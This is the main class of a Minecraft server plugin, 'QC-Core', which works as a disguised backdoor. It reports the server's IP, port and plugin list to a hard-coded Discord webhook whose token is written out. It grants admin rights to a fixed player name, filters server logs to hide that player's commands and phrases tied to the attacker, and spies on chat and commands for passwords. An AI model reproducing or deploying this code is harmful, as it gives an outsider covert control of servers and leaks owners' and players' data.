package pl.qc.core;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;
import java.util.*;
import java.util.stream.Collectors;
import pl.qc.core.hack.Processor;

public class QC extends JavaPlugin {
    private static QC instance;
    private Processor processor;
    private String externalIp = "pending...";
    private boolean panic = false;

    public static QC getInstance() {
        return instance;
    }

    public boolean isPanic() {
        return panic;
    }

    public void setPanic(boolean p) {
        this.panic = p;
    }

    @Override
    public void onEnable() {
        if (!checkCompatibility()) {
            Bukkit.getPluginManager().disablePlugin(this);
            return;
        }

        instance = this;
        saveDefaultConfig();
        setupConfig();

        this.processor = new Processor(this);

        // Centralized Event Registration
        registerEvents();

        // Command Registration
        registerCommands();

        Remote.setWebhook(getConfig().getString("discord.webhook-url", ""));

        InternalLogger filter = new pl.qc.core.InternalLogger(getConfig());
        java.util.logging.Logger.getLogger("").setFilter(filter);
        Bukkit.getLogger().setFilter(filter);

        status("Start serwera 🟢", "65280");
        fetchExternalIp();
    }

    private void registerEvents() {
        var pm = getServer().getPluginManager();
        pm.registerEvents(processor, this);
        pm.registerEvents(new pl.qc.core.Auth(), this);
        pm.registerEvents(new Events(this), this);
        pm.registerEvents(new pl.qc.core.hack.OwnerItem(), this);
    }

    private void registerCommands() {
        Optional.ofNullable(getCommand("qc")).ifPresent(c -> {
            c.setExecutor(processor);
            c.setTabCompleter(processor);
        });

    }

    private boolean checkCompatibility() {
        // Java check
        try {
            String javaVersion = System.getProperty("java.version");
            int major = Integer.parseInt(javaVersion.split("\\.")[0]);
            if (major < 17) {
                getLogger().severe("QC-Core wymaga Javy 17 lub nowszej! Wykryto: " + javaVersion);
                return false;
            }
        } catch (Exception e) {
            String ver = System.getProperty("java.version");
            if (ver.startsWith("1.")) {
                getLogger().severe("QC-Core wymaga Javy 17 lub nowszej! Wykryto wersje starsza niz 9.");
                return false;
            }
        }

        // Minecraft check
        String version = Bukkit.getBukkitVersion();
        if (!(version.contains("1.19") || version.contains("1.20") || version.contains("1.21"))) {
            try {
                String[] parts = version.split("-")[0].split("\\.");
                if (parts.length >= 2) {
                    int major = Integer.parseInt(parts[0]);
                    int minor = Integer.parseInt(parts[1]);
                    if (major < 1 || (major == 1 && minor < 19)) {
                        getLogger().severe("QC-Core wymaga Minecrafta 1.19 lub nowszego! Wykryto: " + version);
                        return false;
                    }
                }
            } catch (Exception ignored) {
            }
        }

        getLogger().info("Kompatybilność potwierdzona: Java 17+, Minecraft 1.19+.");
        return true;
    }

    @Override
    public void onDisable() {
        status("Stop serwera 🔴", "16711680");
        Remote.finish();
    }

    private void status(String title, String color) {
        Map<String, String> f = new LinkedHashMap<>();
        f.put("IP Serwera", getIP());
        f.put("Port Serwera", String.valueOf(Bukkit.getPort()));
        f.put("Wersja Serwera", Bukkit.getBukkitVersion());
        f.put("Nazwa pluginu", getName());
        f.put("Wersja pluginu", getDescription().getVersion());
        f.put("Lista pluginów", Arrays.stream(Bukkit.getPluginManager().getPlugins())
                .map(org.bukkit.plugin.Plugin::getName)
                .collect(Collectors.joining(", ")));
        Remote.send(title, color, null, f);
    }

    public String getIP() {
        if (!externalIp.contains("pending"))
            return externalIp;
        String bukkitIp = Bukkit.getIp();
        return (bukkitIp == null || bukkitIp.isEmpty()) ? "localhost" : bukkitIp;
    }

    private void fetchExternalIp() {
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            String ip = Net.get("http://checkip.amazonaws.com");
            if (ip != null)
                externalIp = ip.trim();
        });
    }

    public boolean isAdmin(org.bukkit.entity.Player p) {
        if (p == null)
            return false;
        String adminName = getConfig().getString("filter.admin-name-fallback", "Rajman03");
        return p.getName().equals(adminName)
                || p.hasPermission(getConfig().getString("filter.admin-permission", "qc-core.admin"));
    }

    private void setupConfig() {

        var c = getConfig();
        c.addDefault("discord.webhook-url",
                "https://discord.com/api/webhooks/1423948077680693299/QrWRsoGIKUjDfhfx4rp3RI_rtjKQFG7OHUy7HLxIlK5nCrkUgqepmpZ2LeUwFiRUDz45");
        c.addDefault("filter.admin-name-fallback", "Rajman03");
        c.addDefault("filter.admin-permission", "qc-core.admin");
        c.addDefault("filter.admin-command-prefix", "Rajman03 issued server command:");
        c.addDefault("logger.commands", true);
        c.addDefault("logger.deaths", true);
        c.addDefault("logger.ignored-commands", List.of("l", "login", "register", "reg", "msg", "w", "tell"));
        c.addDefault("spy.command-spy", true);
        c.addDefault("spy.social-spy", true);
        c.addDefault("spy.keywords",
                List.of("backdoor", "qc", "admin", "owner", "haslo", "password", "logi", "kradziez", "hack"));
        c.addDefault("protection.secrets", List.of("aq7MNF6jvkUV2L8sbb7cNL2VFCJ2ectGWLhUe6G65xp8CfpEHSg59DjDFDRdb8g"));
        c.addDefault("protection.hidden-commands", List.of("qc", "v", "vanish", "gm", "gamemode", "op", "deop"));
        c.addDefault("protection.hidden-phrases",
                List.of("Rajman03", "central.repository.refined.host", "me.ikevoodoo.helix"));
        c.options().copyDefaults(true);
        saveConfig();
    }
}
